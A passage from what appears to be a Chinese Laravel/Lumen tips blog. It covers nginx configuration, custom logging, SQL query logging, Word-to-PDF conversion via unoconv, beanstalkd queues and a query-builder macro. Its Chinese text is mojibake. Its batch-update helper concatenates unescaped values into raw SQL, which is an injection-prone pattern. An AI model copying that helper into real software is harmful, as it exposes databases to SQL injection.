<span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    location ~ \.php$ &#123;</span></span><br><span class="line"><span class="regexp">        fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="regexp">        fastcgi_index  index.php;</span></span><br><span class="line"><span class="regexp">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="regexp">        include        fastcgi_params;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">server &#123;</span></span><br><span class="line"><span class="regexp">    listen       8081;</span></span><br><span class="line"><span class="regexp">    server_name 127.0.0.1;</span></span><br><span class="line"><span class="regexp">    root E:/</span>Project/Module2;</span><br><span class="line">    index  index.php index.html;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    location ~ \.php$ &#123;</span></span><br><span class="line"><span class="regexp">        fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line"><span class="regexp">        fastcgi_index  index.php;</span></span><br><span class="line"><span class="regexp">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span></span><br><span class="line"><span class="regexp">        include        fastcgi_params;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">module2 çš„ Laravel é…ç½® Url</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">.env</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">APP_URL=http:/</span><span class="regexp">/test.local/m</span>odule2</span><br><span class="line">app/Providers/AppServiceProvider</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ç”¨äºä¿®æ­£URLç”Ÿæˆçš„é“¾æ¥</span></span><br><span class="line">        app(<span class="string">'url'</span>)-&gt;forceRootUrl(config(<span class="string">'app.url'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ç”¨äºä¿®æ­£åˆ†é¡µçš„é“¾æ¥</span></span><br><span class="line">        \Illuminate\Pagination\Paginator::currentPathResolver(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;app[<span class="string">'url'</span>]-&gt;current();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Lumen-æ—¥å¿—è‡ªå®šä¹‰"><a href="#Lumen-æ—¥å¿—è‡ªå®šä¹‰" class="headerlink" title="Lumen æ—¥å¿—è‡ªå®šä¹‰"></a>Lumen æ—¥å¿—è‡ªå®šä¹‰</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€åœ¨ Providers ç›®å½•å»ºç«‹ LogServiceProvider.php æ–‡ä»¶ ä»£ç å¦‚ä¸‹</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Providers;</span><br><span class="line"></span><br><span class="line">use Carbon\Laravel\ServiceProvider;</span><br><span class="line">use Monolog\Formatter\LineFormatter;</span><br><span class="line">use Monolog\Handler\RotatingFileHandler;</span><br><span class="line">use Monolog\Processor\IntrospectionProcessor;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $handlers[] = (<span class="keyword">new</span> RotatingFileHandler(storage_path(<span class="string">'logs/lumen.log'</span>), <span class="number">0</span>))</span><br><span class="line">            -&gt;pushProcessor(<span class="keyword">new</span> IntrospectionProcessor())</span><br><span class="line">            -&gt;setFormatter(<span class="keyword">new</span> LineFormatter(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;app[<span class="string">'log'</span>]-&gt;setHandlers($handlers);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">2</span>ã€åœ¨ bootstrap/app.php æ³¨å†Œè¯¥æœæœ</span><br><span class="line"></span><br><span class="line">    $app-&gt;register(App\Providers\LogServiceProvider::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="number">3</span>ã€ä½¿ç”¨æµ‹è¯•</span><br><span class="line"></span><br><span class="line">    app(<span class="string">'log'</span>)-&gt;info(<span class="string">'æˆ‘æ˜¯æµ‹è¯•æ—¥å¿—'</span>);</span><br><span class="line"><span class="number">4</span>ã€ç”Ÿæˆçš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">[<span class="number">2018</span><span class="number">-04</span><span class="number">-11</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">29.313456</span>] local.INFO: æˆ‘æ˜¯æ¥æµ‹è¯•æ—¥å¿—çš„ &#123;<span class="string">"content"</span>:<span class="number">1111</span>&#125; </span><br><span class="line">https:<span class="comment">//learnku.com/articles/32543</span></span><br></pre></td></tr></table></figure>
<h3 id="Lumen-å®æ—¶è®°å½•-SQL"><a href="#Lumen-å®æ—¶è®°å½•-SQL" class="headerlink" title="Lumen å®æ—¶è®°å½• SQL"></a>Lumen å®æ—¶è®°å½• SQL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€åœ¨ Listeners ç›®å½•æ–°å»º QueryListener.php æ–‡ä»¶ ä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Listeners;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Events\QueryExecuted;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueryListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">QueryExecuted $event</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (env(<span class="string">'APP_ENV'</span>, <span class="string">'production'</span>) == <span class="string">'local'</span>) &#123;</span><br><span class="line">            $sql = str_replace(<span class="string">'?'</span>, <span class="string">"'%s'"</span>, $event-&gt;sql);</span><br><span class="line">            $log = vsprintf($sql, $event-&gt;bindings);</span><br><span class="line">            $<span class="keyword">this</span>-&gt;put_log(<span class="string">'sql'</span>, $log);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">put_log</span>(<span class="params">$file = <span class="string">'app'</span>, $content = <span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $data = date(<span class="string">'Y-m-d'</span>);</span><br><span class="line">        $cut_line = str_repeat(<span class="string">"-"</span>, <span class="number">100</span>);</span><br><span class="line">        is_dir(storage_path(<span class="string">'logs/sql'</span>)) or mkdir (storage_path(<span class="string">'logs/sql'</span>), <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">// æ–‡ä»¶å¤¹ä¸å­˜åœ¨åˆ™åˆ›å»º</span></span><br><span class="line">        $content = <span class="string">'['</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">"]"</span> . $content;</span><br><span class="line">        @file_put_contents(storage_path(<span class="string">'logs/sql/'</span> . $file . <span class="string">'-'</span> . $data . <span class="string">'.log'</span>), $content . <span class="string">"\n"</span> . $cut_line . <span class="string">"\n\n"</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">2</span>ã€åœ¨ Providers/EventServiceProvider.php æ·»åŠ å¦‚ä¸‹ä»£ç </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Providers;</span><br><span class="line"></span><br><span class="line">use Laravel\Lumen\Providers\EventServiceProvider <span class="keyword">as</span> ServiceProvider;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The event listener mappings for the application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $listen = [</span><br><span class="line"></span><br><span class="line">        <span class="string">'Illuminate\Database\Events\QueryExecuted'</span> =&gt; [</span><br><span class="line">            <span class="string">'App\Listeners\QueryListener'</span></span><br><span class="line">        ],</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3</span>ã€åœ¨ bootstrap/app.php æ–‡ä»¶ä¸­å¼€å¯ EventServiceProvider æ³¨å†Œå³å¯</span><br><span class="line"></span><br><span class="line"> $app-&gt;register(App\Providers\EventServiceProvider::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="number">4</span>ã€æ¥ä¸‹æ¥å†™ä¸€ä¸ª sql è¯­å¥å°±èƒ½åœ¨ storage/logs/sql çœ‹åˆ°ç”Ÿæˆçš„ sql æ—¥å¿—äº†</span><br><span class="line"></span><br><span class="line">    app(<span class="string">'db'</span>)-&gt;where(<span class="string">'id'</span>, <span class="string">'&gt;'</span>, <span class="string">'5'</span>)-&gt;get();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32540</span></span><br></pre></td></tr></table></figure>
<h3 id="æ›¿æ¢-Word-é‡Œé¢å˜é‡å¹¶å¯¼å‡º-PDF"><a href="#æ›¿æ¢-Word-é‡Œé¢å˜é‡å¹¶å¯¼å‡º-PDF" class="headerlink" title="æ›¿æ¢ Word é‡Œé¢å˜é‡å¹¶å¯¼å‡º PDF"></a>æ›¿æ¢ Word é‡Œé¢å˜é‡å¹¶å¯¼å‡º PDF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    composer <span class="built_in">require</span> phpoffice/phpword</span><br><span class="line">use PhpOffice\PhpWord\TemplateProcessor;</span><br><span class="line"> $path = storage_path(<span class="string">'aa.docx'</span>);</span><br><span class="line">        <span class="comment">// ç”Ÿæˆworld å­˜æ”¾ç›®å½•</span></span><br><span class="line">        $filePath = storage_path(<span class="string">'contract.docx'</span>);</span><br><span class="line">        <span class="comment">// å£°æ˜æ¨¡æ¿è±¡å¹¶è¯»å–æ¨¡æ¿å†…å®¹</span></span><br><span class="line">        $templateProcessor = <span class="keyword">new</span> TemplateProcessor($path);</span><br><span class="line">        <span class="comment">// æ›¿æ¢æ¨¡æ¿å†…å®¹</span></span><br><span class="line">        $templateProcessor-&gt;setValue(<span class="string">'contract'</span>, <span class="string">'åŒ—äº¬ä¹™æ–¹'</span>);  <span class="comment">// ä¹™æ–¹</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæ–°çš„ world</span></span><br><span class="line">        $templateProcessor-&gt;saveAs($filePath);</span><br><span class="line">      apt-get install unoconv</span><br><span class="line">      #å¦‚æœæŠ¥é”™è¯·æ±‚æœåŠ¡å™¨è¯­è¨€è®¾ç½®ä¸º LANG=â€en_US.UTF-8â€³</span><br><span class="line">      </span><br><span class="line">      #ä½¿ç”¨å‘½ä»¤æŠŠ word è½¬ä¸º pdf</span><br><span class="line">      unoconv -f pdf aa.docx</span><br><span class="line">      #è¿™ä¸ªæ—¶å€™åœ¨å½“å‰ç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ª aa.pdf çš„æ–‡ä»¶å‡ºæ¥</span><br><span class="line">      #ä½†æ˜¯ä¼šå‘ç°å¦‚æœæ˜¯ä¸­æ–‡çš„æƒ…å†µä¸‹è½¬å‡ºæ¥çš„ pdf æ˜¯ä¹±ç è¯¥å¦‚ä½•è§£å†³  </span><br><span class="line">            # æŠŠç”µè„‘æœ¬æœºçš„å®‹ä½“ä¸Šä¼ åˆ°æœåŠ¡å™¨å­—ä½“ç›®å½•ä¸‹ /usr/share/fonts æ–°å»ºä¸€ä¸ªç›®å½• win æˆ–è€…å…¶å®ƒï¼ŒæŠŠä¸­æ–‡å­—ä½“ä¸Šä¼ åˆ°è¯¥ç›®å½•ä¸‹</span><br><span class="line">            apt-get install mkfontscale  #å®‰è£…è¿™ä¸ªå·¥å…·</span><br><span class="line">            # è¿›å…¥åˆ°/usr/share/fonts/win/ æ‰§è¡Œå‘½ä»¤</span><br><span class="line">            mkfontscale &amp;&amp; sudo mkfontdir &amp;&amp; sudo fc-cache -fv</span><br><span class="line">            # ç„¶åé‡å¯æœåŠ¡å™¨è®©å­—ä½“ç”Ÿæ•ˆ</span><br><span class="line">            reboot</span><br><span class="line">            # æœ€ååœ¨æ‰§è¡Œ</span><br><span class="line">            unoconv -f pdf aa.docx</span><br><span class="line">            # çœ‹æ˜¯ä¸æ˜¯ä¸­æ–‡ä¹±ç çš„é—®é¢˜è§£å†³äº†</span><br><span class="line">      ä½¿ç”¨ php çš„æ‰§è¡Œ shell çš„å‡½æ•°æ¥è°ƒç”¨è¯¥å‡½æ•°è‡ªåŠ¨ç”Ÿæˆå³å¯</span><br><span class="line">      </span><br><span class="line">      shell_exec(<span class="string">'/usr/binunoconv -f pdf aa.docx'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ä¸»é”®è¿›è¡Œæ‰¹é‡æ›´æ–°"><a href="#ä¸»é”®è¿›è¡Œæ‰¹é‡æ›´æ–°" class="headerlink" title="ä¸»é”®è¿›è¡Œæ‰¹é‡æ›´æ–°"></a>ä¸»é”®è¿›è¡Œæ‰¹é‡æ›´æ–°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * æ ¹æ®Idæ‰¹é‡æ›´æ–°æ•°æ®ï¼Œå¯ä»¥æ”¾åœ¨modelé‡Œé¢ï¼Œä½¿å¾—æ¯ä¸ªmodeléƒ½æ˜¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="comment">   * @author yezi</span></span><br><span class="line"><span class="comment">   * @param array $multipleData</span></span><br><span class="line"><span class="comment">   * @return bool</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">updateBatch</span>(<span class="params">$multipleData = array(</span>))</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $tableName = \DB::getTablePrefix() . app(Contract::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">getTable</span>()</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_array($multipleData))&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> CustomValidationException(<span class="string">'must be an array'</span>,<span class="literal">null</span>,<span class="string">'6001'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($multipleData <span class="keyword">as</span> &amp;$row)&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!array_key_exists(<span class="string">'id'</span>,$row))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> CustomValidationException(<span class="string">'å‚æ•°é”™è¯¯,ç¼ºå°‘ä¸»é”®'</span>,<span class="literal">null</span>,<span class="string">'6001'</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $row[Model::FIELD_UPDATED_AT] = Carbon::now();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($tableName &amp;&amp; !empty($multipleData)) &#123;</span><br><span class="line"></span><br><span class="line">      $updateColumn  = array_keys($multipleData[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      $referenceColumn = $updateColumn[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">      unset($updateColumn[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">      $whereIn = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">      $q = <span class="string">"UPDATE "</span> . $tableName . <span class="string">" SET "</span>;</span><br><span class="line"></span><br><span class="line">      foreach ($updateColumn <span class="keyword">as</span> $uColumn) &#123;</span><br><span class="line"></span><br><span class="line">        $q .= $uColumn . <span class="string">" = CASE "</span>;</span><br><span class="line"></span><br><span class="line">        foreach ($multipleData <span class="keyword">as</span> $data) &#123;</span><br><span class="line"></span><br><span class="line">          $q .= <span class="string">"WHEN "</span> . $referenceColumn . <span class="string">" = "</span> . $data[$referenceColumn] . <span class="string">" THEN '"</span> . $data[$uColumn] . <span class="string">"' "</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $q .= <span class="string">"ELSE "</span> . $uColumn . <span class="string">" END, "</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      foreach ($multipleData <span class="keyword">as</span> $data) &#123;</span><br><span class="line"></span><br><span class="line">        $whereIn .= <span class="string">"'"</span> . $data[$referenceColumn] . <span class="string">"', "</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $q = rtrim($q, <span class="string">", "</span>) . <span class="string">" WHERE "</span> . $referenceColumn . <span class="string">" IN ("</span> . rtrim($whereIn, <span class="string">', '</span>) . <span class="string">")"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> \DB::update(\DB::raw($q));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;https:<span class="comment">//geixue.com/blogs/channels/laravel/laravel-shares-a-way-to-do-bulk-updates-based-on-the-primary-key-qjhqc5</span></span><br></pre></td></tr></table></figure>
<h3 id="Laradock-ä¸­ä½¿ç”¨-beanstalkd"><a href="#Laradock-ä¸­ä½¿ç”¨-beanstalkd" class="headerlink" title="Laradock ä¸­ä½¿ç”¨ beanstalkd"></a>Laradock ä¸­ä½¿ç”¨ beanstalkd</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker-compose up -d beanstalkd</span><br><span class="line">composer <span class="built_in">require</span> pda/pheanstalk</span><br><span class="line">æ›´æ”¹ .env æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">è®¾ç½® QUEUE_CONNECTION ä¸º beanstalkd, è®¾ç½® beanstalkd ä¸ºé»˜è®¤é˜Ÿåˆ—é©±åŠ¨ã€‚</span><br><span class="line">æ–°å¢é…ç½®é¡¹ QUEUE_HOST=beanstalkdï¼Œä»£è¡¨ä½¿ç”¨ laradock ä¸­ beanstalkd çš„ host ä»¥åŠç«¯å£ï¼Œç«¯å£é»˜è®¤å€¼ä¸º <span class="number">11300</span>ã€‚</span><br><span class="line">QUEUE_HOST=beanstalkd </span><br><span class="line">QUEUE_CONNECTION=beanstalkd</span><br><span class="line">æ›´æ”¹ config/queue.php æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹ connections ä¸‹é¢çš„ beanstalkd æ•°ç»„ä¸­ host çš„å€¼ä¸º env(<span class="string">'QUEUE_HOST'</span>, <span class="string">'localhost'</span>)ï¼Œæ„æ€å°±æ˜¯é»˜è®¤ä½¿ç”¨ .env æ–‡ä»¶ä¸­å®šä¹‰çš„ QUEUE_HOST å€¼</span><br><span class="line"></span><br><span class="line"><span class="string">'connections'</span> =&gt; [</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line"></span><br><span class="line">    <span class="string">'beanstalkd'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'beanstalkd'</span>,</span><br><span class="line">        <span class="string">'host'</span> =&gt; env(<span class="string">'QUEUE_HOST'</span>, <span class="string">'localhost'</span>),</span><br><span class="line">        <span class="string">'queue'</span> =&gt; <span class="string">'default'</span>,</span><br><span class="line">        <span class="string">'retry_after'</span> =&gt; <span class="number">90</span>,</span><br><span class="line">        <span class="string">'block_for'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    ],</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">],</span><br><span class="line">ä½¿ç”¨ beanstalkd_console ä» Web ç•Œé¢ç®¡ç†æ‚¨çš„é˜Ÿåˆ—</span><br><span class="line"></span><br><span class="line">è¿è¡Œ Beanstalkd æ§åˆ¶å°å®¹å™¨</span><br><span class="line">docker-compose up -d beanstalkd-<span class="built_in">console</span></span><br><span class="line">è®¿é—® http:<span class="comment">//localhost:2080/  https://learnku.com/articles/32366</span></span><br></pre></td></tr></table></figure>
<h3 id="æ³¨å†Œäº†å¤šå°‘æ¡è·¯ç”±"><a href="#æ³¨å†Œäº†å¤šå°‘æ¡è·¯ç”±" class="headerlink" title="æ³¨å†Œäº†å¤šå°‘æ¡è·¯ç”±"></a>æ³¨å†Œäº†å¤šå°‘æ¡è·¯ç”±</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan route:list | wc -l | awk <span class="string">'&#123;print $1 - 4&#125;'</span></span><br><span class="line">è·å–åˆ°ä¸Šé¢çš„ç»Ÿè®¡åˆ°çš„è¡Œæ•°å†å‡å» <span class="number">4</span>ï¼ˆå› ä¸º list ä¸­åŒ…å«äº† <span class="number">3</span> è¡Œåˆ¶è¡¨ç¬¦ å’Œ <span class="number">1</span> è¡Œè¡¨å¤´ï¼‰ï¼Œæœ€ç»ˆå¾—åˆ°äº†ä½ çš„è·¯ç”±æ•°é‡</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-ORM-SQL-è¯­å¥æŸ¥è¯¢"><a href="#Laravel-ORM-SQL-è¯­å¥æŸ¥è¯¢" class="headerlink" title="Laravel ORM SQL è¯­å¥æŸ¥è¯¢"></a>Laravel ORM SQL è¯­å¥æŸ¥è¯¢</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ app/Providers/AppServiceProvider ä¸­çš„ boot æ–¹æ³•ä¸­æ–°å¢ä»¥ä¸‹ä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">\Illuminate\Database\Query\Builder::macro(<span class="string">'sql'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $bindings = $<span class="keyword">this</span>-&gt;getBindings();</span><br><span class="line">    $sql = str_replace(<span class="string">'?'</span>,<span class="string">'%s'</span>,$<span class="keyword">this</span>-&gt;toSql());</span><br><span class="line">    <span class="keyword">return</span> vsprintf($sql, $bindings);</span><br><span class="line">&#125;);</span><br><span class="line">\Illuminate\Database\Eloquent\Builder::macro(<span class="string">'sql'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ($<span class="keyword">this</span>-&gt;getQuery()-&gt;sql());</span><br><span class="line">&#125;);</span><br><span class="line">äºŒã€ä½¿ç”¨æ–¹å¼</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢å¸¦å‚æ•°çš„ SQL è¯­å¥å¯åœ¨ ORM åè°ƒç”¨æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£ç¡®ç”¨æ³•</span></span><br><span class="line">User::query()-&gt;where(<span class="string">'id'</span>, <span 